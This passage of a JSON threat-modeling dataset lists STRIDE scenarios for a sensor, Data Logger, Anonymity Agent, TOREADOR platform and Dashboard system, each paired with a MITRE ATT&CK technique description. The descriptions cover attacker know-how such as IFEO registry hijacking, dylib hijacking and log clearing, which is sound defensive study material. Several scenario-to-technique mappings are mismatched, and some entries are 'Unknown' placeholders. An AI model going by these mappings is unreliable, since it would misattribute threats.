            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Impersonation of the Anonymity Agent to retrieve raw data without anonymization.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication channel between the Data Logger and the Anonymity Agent.",
                    "Role": "Attacker",
                    "Condition": "Insufficient encryption of communication."
                },
                {
                    "Assumption": "There are insufficient identity verification mechanisms for components.",
                    "Role": "System Architect",
                    "Condition": "Lack of multi-layer authentication."
                },
                {
                    "Assumption": "The Anonymity Agent's identity is not periodically verified.",
                    "Role": "System Administrator",
                    "Condition": "Static verification mechanisms."
                }
            ],
            "Potential Impact": "Exposure of sensitive data leading to confidentiality breaches.",
            "MITRE ATT&CK Keywords": [
                "component impersonation",
                "anonymity",
                "data retrieval",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Modification of sensor data in transit to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel between the sensors and Data Logger is not sufficiently protected.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "The attacker has access to the communication infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Compromised network infrastructure."
                },
                {
                    "Assumption": "Sensor data integrity is not verified at the Data Logger.",
                    "Role": "System Architect",
                    "Condition": "Lack of data validation mechanisms."
                }
            ],
            "Potential Impact": "Corruption of sensor data leading to false predictions, impacting integrity.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "sensor manipulation",
                "network",
                "transit"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Alteration of AI/ML model parameters in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the TOREADOR platform.",
                    "Role": "Attacker",
                    "Condition": "Compromised platform credentials or vulnerabilities."
                },
                {
                    "Assumption": "Model parameters are not protected or validated.",
                    "Role": "System Architect",
                    "Condition": "Lack of configuration management."
                },
                {
                    "Assumption": "Insufficient auditing and monitoring of changes within the platform.",
                    "Role": "System Administrator",
                    "Condition": "Lack of change tracking."
                }
            ],
            "Potential Impact": "False predictions impacting both integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "ml model tampering",
                "parameter change",
                "cloud platform"
            ],
            "mitre_technique": {
                "name": "Implant Internal Image",
                "description": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim\u2019s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\n\nA tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)",
                "id": "attack-pattern--4fd8a28b-4b3a-4cd6-a8cf-85ba5f824a7f",
                "technique_id": "T1525"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Manipulation of data stored in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Data stored is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "The attacker has compromised platform access.",
                    "Role": "Attacker",
                    "Condition": "Credential misuse or platform vulnerabilities."
                },
                {
                    "Assumption": "No data integrity verification mechanisms are implemented.",
                    "Role": "System Administrator",
                    "Condition": "Lack of integrity checks."
                }
            ],
            "Potential Impact": "Data corruption impacting prediction accuracy and operational decisions.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "storage tampering",
                "cloud",
                "data validation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes actions taken via the Dashboard interface.",
            "Assumptions": [
                {
                    "Assumption": "Action logging on the Dashboard is insufficient or tampered.",
                    "Role": "System Architect",
                    "Condition": "Lack of detailed and tamper-proof logs."
                },
                {
                    "Assumption": "Insufficient access control mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Lack of role-based access control."
                },
                {
                    "Assumption": "Lack of multi-factor authentication.",
                    "Role": "System Architect",
                    "Condition": "Single-factor authentication only."
                }
            ],
            "Potential Impact": "Difficulty in tracking and auditing actions leading to potential unauthorized changes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "action logging",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Anonymity Agent operations are disputed due to insufficient logs.",
            "Assumptions": [
                {
                    "Assumption": "Operation logs for the Anonymity Agent are minimal or alterable.",
                    "Role": "System Architect",
                    "Condition": "Lack of comprehensive and immutable logs."
                },
                {
                    "Assumption": "Anonymity Agent operations are not monitored in real-time.",
                    "Role": "System Administrator",
                    "Condition": "Lack of real-time monitoring."
                },
                {
                    "Assumption": "Insufficient authentication and authorization mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Weak authentication controls."
                }
            ],
            "Potential Impact": "Challenges in verifying the origins and integrity of anonymized data.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "anonymity agent",
                "logs"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Disputes over changes made to ML models or their decision logic.",
            "Assumptions": [
                {
                    "Assumption": "Changes to ML models are not logged comprehensively.",
                    "Role": "System Architect",
                    "Condition": "Lack of detailed logs for model changes."
                },
                {
                    "Assumption": "No version control for AI/ML models.",
                    "Role": "System Architect",
                    "Condition": "Absence of versioning mechanisms."
                },
                {
                    "Assumption": "Lack of monitoring for unauthorized access.",
                    "Role": "System Administrator",
                    "Condition": "No real-time access monitoring."
                }
            ],
            "Potential Impact": "Inability to trace and verify model updates leading to unauthorized alterations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "ml model changes",
                "model versioning"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unencrypted data intercepted during transmission between sensors and Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted in clear text.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "Attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Compromised network infrastructure."
                },
                {
                    "Assumption": "No additional communication security measures in place.",
                    "Role": "System Architect",
                    "Condition": "Absence of secure transmission protocols."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "network",
                "unencrypted transmission"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Access to anonymized data which could be reverse-engineered.",
            "Assumptions": [
                {
                    "Assumption": "Anonymization methods are weak or flawed.",
                    "Role": "System Architect",
                    "Condition": "Ineffective anonymization techniques."
                },
                {
                    "Assumption": "Attacker has access to anonymized data sets.",
                    "Role": "Attacker",
                    "Condition": "Compromised or legitimate access."
                },
                {
                    "Assumption": "Availability of supplementary information to cross-reference.",
                    "Role": "Attacker",
                    "Condition": "External data sources available."
                }
            ],
            "Potential Impact": "Re-identification of individuals or sensitive data breaching confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data anonymization",
                "re-identification",
                "data access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to metadata information.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls on metadata.",
                    "Role": "System Architect",
                    "Condition": "Lax access control policies."
                },
                {
                    "Assumption": "Metadata stored without encryption.",
                    "Role": "System Architect",
                    "Condition": "Lack of encrypted storage."
                },
                {
                    "Assumption": "No monitoring of metadata access.",
                    "Role": "System Administrator",
                    "Condition": "Lack of access logging."
                }
            ],
            "Potential Impact": "Exposure of sensitive metadata compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "metadata access",
                "unauthorized access",
                "data storage"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding the Dashboard with excessive requests leading to service disruption.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting on Dashboard requests.",
                    "Role": "System Architect",
                    "Condition": "Absence of throttle mechanisms."
                },
                {
                    "Assumption": "Attacker can generate large volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Availability of botnets or compromised devices."
                },
                {
                    "Assumption": "Insufficient infrastructure to handle spike in traffic.",
                    "Role": "System Architect",
                    "Condition": "Lack of load balancing and failover systems."
                }
            ],
            "Potential Impact": "Service disruption affecting system availability.",
            "MITRE ATT&CK Keywords": [
                "dos attack",
                "traffic flooding",
                "dashboard",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Interruption of the Data Logger by sending malformed data.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has ability to send data to Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Compromised control over network."
                },
                {
                    "Assumption": "Data Logger lacks input validation.",
                    "Role": "System Architect",
                    "Condition": "Absence of robust validation mechanisms."
                },
                {
                    "Assumption": "Data Logger processing resources are limited.",
                    "Role": "System Architect",
                    "Condition": "Insufficient computational capabilities."
                }
            ],
            "Potential Impact": "Inability to collect and forward data impacting availability.",
            "MITRE ATT&CK Keywords": [
                "service disruption",
                "malformed data",
                "data logger",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Overloading the Anonymity Agent with excessive data causing service delays.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting on data processing by Anonymity Agent.",
                    "Role": "System Architect",
                    "Condition": "Lack of processing limits."
                },
                {
                    "Assumption": "Attacker has the capability to generate excessive data.",
                    "Role": "Attacker",
                    "Condition": "Control over data influx through compromised devices or networks."
                },
                {
                    "Assumption": "Insufficient processing capability within the Anonymity Agent.",
                    "Role": "System Architect",
                    "Condition": "Limited system resources available."
                }
            ],
            "Potential Impact": "Delay or halt in data anonymization impacting processing availability.",
            "MITRE ATT&CK Keywords": [
                "service delay",
                "excessive data",
                "anonymity agent",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of unpatched vulnerabilities in the TOREADOR platform to gain higher access levels.",
            "Assumptions": [
                {
                    "Assumption": "TOREADOR platform has known vulnerabilities that are unpatched.",
                    "Role": "System Administrator",
                    "Condition": "Delay in applying security patches."
                },
                {
                    "Assumption": "Attacker has access to exploit tools.",
                    "Role": "Attacker",
                    "Condition": "Availability of exploit scripts and tools."
                },
                {
                    "Assumption": "Insufficient access controls within the platform.",
                    "Role": "System Architect",
                    "Condition": "Weak or faulty access control mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized alterations in system settings or data affecting integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "unpatched vulnerability",
                "platform exploit"
            ],
            "mitre_technique": {
                "name": "Image File Execution Options Injection",
                "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
                "id": "attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6",
                "technique_id": "T1546.012"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Circumventing user access control to gain admin privileges on the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient segregation of user roles and privileges.",
                    "Role": "System Architect",
                    "Condition": "Weak role-based access control policies."
                },
                {
                    "Assumption": "Vulnerabilities exist within the Dashboard application.",
                    "Role": "System Administrator",
                    "Condition": "Presence of exploitable flaws or bugs."
                },
                {
                    "Assumption": "Attacker can access user credentials.",
                    "Role": "Attacker",
                    "Condition": "Compromised or weak user passwords."
                }
            ],
            "Potential Impact": "Unauthorized access to admin functionalities affecting data and system settings.",
            "MITRE ATT&CK Keywords": [
                "admin access",
                "privilege escalation",
                "dashboard",
                "authentication bypass"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--38e4e391-599e-4ba1-be5c-118f3f5f9e35",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Gaining root access to the Data Logger via weak or default credentials.",
            "Assumptions": [
                {
                    "Assumption": "Default or weak credentials are used.",
                    "Role": "System Administrator",
                    "Condition": "Neglecting to change default credentials."
                },
                {
                    "Assumption": "Attacker has network access to the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Local network access or compromised network."
                },
                {
                    "Assumption": "No additional authentication mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Lack of multi-factor authentication."
                }
            ],
            "Potential Impact": "Full control over data collected and transmitted affecting integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "root access",
                "default credentials",
                "data logger",
                "network access"
            ],
            "mitre_technique": {
                "name": "Dylib Hijacking",
                "description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
                "id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
                "technique_id": "T1574.004"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "14",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a valid sensor to inject false data into the system.",
            "Assumptions": [
                {
                    "Assumption": "Sensors do not have strong mutual authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "The sensors and data logger must rely on simple or malformed authentication protocols."
                },
                {
                    "Assumption": "The attacker has physical or remote access to the sensor network.",
                    "Role": "Attacker",
                    "Condition": "Valid when physical security is weak or network is accessible remotely."
                },
                {
                    "Assumption": "The system does not quickly detect and isolate abnormal sensor behavior.",
                    "Role": "System",
